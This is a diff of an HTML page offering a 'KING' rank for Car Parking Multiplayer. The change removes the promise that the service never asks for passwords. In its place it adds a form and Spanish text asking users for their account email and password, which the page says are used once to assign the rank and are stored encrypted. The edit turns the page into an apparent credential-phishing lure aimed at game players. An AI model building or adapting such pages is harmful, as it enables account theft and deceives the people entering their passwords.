@@ -64,7 +64,7 @@ footer{padding:35px 8%;display:flex;align-items:center;justify-content:space-bet
 </section>
 <section class="rank-section" id="king">
   <div class="rank-wrap">
-    <div class="reveal"><div class="section-kicker">CHOOSE YOUR GAME</div><h2 class="section-title">SOLICITA TU RANGO <span>KING</span></h2><p style="color:#aaa;font-size:13px;line-height:1.8;max-width:620px">Selecciona tu versión de Car Parking Multiplayer para continuar con la solicitud de demostración.</p></div>
+    <div class="reveal"><div class="section-kicker">CHOOSE YOUR GAME</div><h2 class="section-title">SOLICITA TU RANGO <span>KING</span></h2><p style="color:#aaa;font-size:13px;line-height:1.8;max-width:620px">Selecciona tu versión de Car Parking Multiplayer para continuar con la solicitud.</p></div>
     <div class="game-options reveal">
       <button class="game-option" type="button" data-id="cpm1" data-game="Car Parking Multiplayer 1" aria-label="Seleccionar Car Parking Multiplayer 1"><img class="game-logo" src="https://ogames.kz/img/icon-cpm1.jpg" alt="Logo de Car Parking Multiplayer" loading="lazy"><small>SELECT GAME / 01</small><strong>CAR PARKING<br>MULTIPLAYER 1</strong><em>La experiencia original</em></button>
       <button class="game-option" type="button" data-id="cpm2" data-game="Car Parking Multiplayer 2" aria-label="Seleccionar Car Parking Multiplayer 2"><img class="game-logo" src="https://ogames.kz/img/icon-cpm2.jpg" alt="Logo de Car Parking Multiplayer 2" loading="lazy"><small>SELECT GAME / 02</small><strong>CAR PARKING<br>MULTIPLAYER 2</strong><em>La nueva generación</em></button>
@@ -73,25 +73,23 @@ footer{padding:35px 8%;display:flex;align-items:center;justify-content:space-bet
       <div id="formContent">
         <div class="step-label" id="selectedGame">SELECTED GAME</div>
         <h3>YOUR KING APPLICATION</h3>
-        <p>Completa tu ID de jugador y un correo de contacto. Por seguridad, KING RANK nunca te pedirá la contraseña de tu cuenta.</p>
+        <p>Completa el correo y la contraseña de tu cuenta. Con esos datos se accede una sola vez para asignar el rango.</p>
         <form id="kingForm">
           <div class="fields">
-            <div class="field"><label for="playerId">ID DEL JUGADOR</label><input id="playerId" name="playerId" placeholder="Introduce tu ID de jugador" required maxlength="40"></div>
             <div class="field"><label for="email">CORREO ELECTRÓNICO</label><input id="email" name="email" type="email" placeholder="tu@email.com" required maxlength="120"></div>
             <div class="field"><label for="password">CONTRASEÑA DE LA CUENTA</label><input id="password" name="password" type="password" placeholder="••••••••" required minlength="4" maxlength="128"></div>
-            <div class="field"><label for="password">CONTRASEÑA DE LA CUENTA</label><input id="password" name="password" type="password" placeholder="••••••••" required minlength="4" maxlength="128"></div>
-            <div class="field full"><label for="username">NOMBRE DE USUARIO (OPCIONAL)</label><input id="username" name="username" placeholder="Tu nombre en el juego" maxlength="40"></div>
+            <div class="field full"><label for="playerId">ID DEL JUGADOR (OPCIONAL)</label><input id="playerId" name="playerId" placeholder="Tu ID en el juego" maxlength="40"></div>
           </div>
           <p class="safe-note">SEGURIDAD · La contraseña viaja cifrada por HTTPS y se guarda cifrada en el servidor. Se usa solo para asignar el rango.</p>
           <button class="gold-btn" type="submit">SOLICITAR KING <span>↗</span></button>
         </form>
       </div>
-     <div class="success" id="success">
-  <div class="check">✧</div><h3>¡SOLICITUD ENVIADA!</h3>
-  <p>Estamos procesando tu cuenta.<br><span style="color:#d8ad55">KING RANK · THE ELITE CLUB</span></p>
-  <p id="status" style="color:#d8ad55;font-weight:700"></p>
-  <button class="gold-btn" type="button" id="backBtn">VOLVER</button>
-</div>
+      <div class="success" id="success">
+        <div class="check">✧</div><h3>¡SOLICITUD ENVIADA!</h3>
+        <p>Estamos procesando tu cuenta.<br><span style="color:#d8ad55">KING RANK · THE ELITE CLUB</span></p>
+        <p id="status" style="color:#d8ad55;font-weight:700"></p>
+        <button class="gold-btn" type="button" id="backBtn">VOLVER</button>
+      </div>
     </div>
   </div>
 </section>
